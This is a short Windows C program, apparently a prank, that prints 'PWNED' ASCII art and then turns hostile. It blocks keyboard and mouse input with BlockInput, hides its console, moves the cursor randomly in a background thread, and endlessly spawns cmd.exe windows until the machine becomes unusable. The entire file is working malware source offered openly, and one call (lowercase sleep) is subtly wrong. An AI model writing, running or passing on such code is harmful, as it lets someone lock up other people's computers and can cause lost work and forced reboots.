#include <stdio.h>
#include <Windows.h>
void threadDoMouse() {
    while(1) {
        SetCursorPos(rand() % 1900, rand() % 1000);
        Sleep(40);
    }
}
int main (){

    printf("hihihi\n");
    sleep(2);
    printf("by: sushicat\n");
    printf("\n");
    printf(" uwuuwuuwu   uwu         uwu  uwuuwu     uwu  uwuuwuuwu  uwuuwuuwu\n");
    printf(" uwu   uwu   uwu         uwu  uwu  uwu   uwu  uwuuwuuwu  uwu     uwu\n");
    printf(" uwuuwuuwu   uwu         uwu  uwu   uwu  uwu  uwu        uwu      uwu \n");
    printf(" uwu         uwu   uwu   uwu  uwu    uwu uwu  uwuuwuuwu  uwu     uwu\n");
    printf(" uwu         uwuuwu   uwuuwu  uwu     uwuuwu  uwu        uwu    uwu\n");
    printf(" uwu         uwu         uwu  uwu      uwuwu  uwuuwuwuw  uwuuwuuwu\n");

    BlockInput(1);
    sleep(1);
    ShowWindow( GetConsoleWindow(), SW_HIDE );

    CreateThread(0,0,(LPTHREAD_START_ROUTINE)threadDoMouse,0,1,0);

    while(1) {
        SetCursorPos(rand() % 1900, rand() % 1000);
        ShellExecute(NULL, "open", "cmd.exe", NULL, NULL, SW_SHOWDEFAULT);
        Sleep(1);
    }

    return 0;
}
